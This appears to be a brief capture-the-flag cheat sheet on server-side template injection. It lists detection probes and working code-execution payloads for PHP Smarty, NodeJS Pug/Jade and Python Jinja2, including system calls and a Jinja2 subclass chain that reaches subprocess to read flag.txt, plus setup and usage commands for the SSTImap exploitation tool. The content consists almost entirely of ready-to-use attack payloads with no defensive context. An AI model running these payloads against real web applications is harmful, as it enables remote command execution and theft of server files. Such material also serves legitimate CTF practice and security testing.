## PHP Smarty

- identify:

```bash
{'Hello'|upper}
```

- exploit:

```bash
{system("ls")}
```

## NodeJS Pug / Jade

- identify:

```bash
#{7*7}
```

- exploit:

```bash
#{root.process.mainModule.require('child_process').spawnSync('cat', ['flag.txt']).stdout}
```

## Python Jinja2

- identify:

```bash
{{7*7}}
```

- exploit:

```bash
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['cat', 'flag.txt'])}}
```

## SSTIMAP

- install

```bash
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
python3 -m venv venv
source venv/bin/activate
pip3 install -r ./requirements.txt
```

- use

```bash
python3 sstimap.py -X POST -u 'http://url:port/' -d 'page='
```
